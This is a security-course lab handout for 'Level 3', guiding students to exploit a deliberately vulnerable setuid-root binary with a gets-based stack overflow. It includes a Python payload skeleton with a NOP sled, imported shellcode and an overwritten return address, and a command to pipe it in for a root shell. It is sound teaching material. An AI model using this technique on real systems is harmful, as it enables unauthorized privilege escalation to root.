# Level 3 — "NOP Sled → Root Shell"

Level 1 corrupted data. Level 2 hijacked control flow to an existing
function (`professor_mode`). Level 3 injects **shellcode** and uses a
**NOP sled** because your return address into the buffer may be slightly off.

**Win condition:** a shell where `id` shows `uid=0(root)`.

Before the attack, `id` should show your normal student user. The Level 3
binary is **setuid-root** on the course VM.

Use `shellcode.py` — do not invent the bytes from scratch.

---

## Why a NOP sled?

You place shellcode in the buffer and point the return address **back into
that buffer**. If you miss the first byte of the shellcode, you crash.

```text
[ NOP NOP NOP NOP | shellcode ]
  ^         ^
  land here or here — both slide into shellcode
```

**Challenge:** clear the level with two different landings (e.g. `buf+8` and
`buf+40`).

---

## Step 1 — Build

```bash
make
file vulnerable
```

**Read every compiler warning** (especially about `gets`). That is part of
the lab.

```bash
cat /proc/sys/kernel/randomize_va_space   # expect 0
```

## Step 2 — Recon

```bash
./vulnerable
# note [leak] buffer @ ...
id   # should NOT be root yet
```

## Step 3 — Measure offset to the return address on your VM

## Step 4 — Payload

```python
import sys, struct
from shellcode import shellcode

buf = 0xREPLACE_ME
offset = REPLACE_ME
land = 16   # also try 8 and 40

nops = b"\x90" * 80
padding = b"A" * (offset - len(nops) - len(shellcode))
ret = struct.pack("<I", buf + land)
sys.stdout.buffer.write(nops + shellcode + padding + ret)
```

```bash
(python3 solve.py; cat) | ./vulnerable
id      # expect uid=0(root)
exit
```

## Step 5 — Submit

- solve script + two working land addresses
- short writeup: offset vs return-address value; why NOPs help; what
  `setuid` + `/bin/sh` do
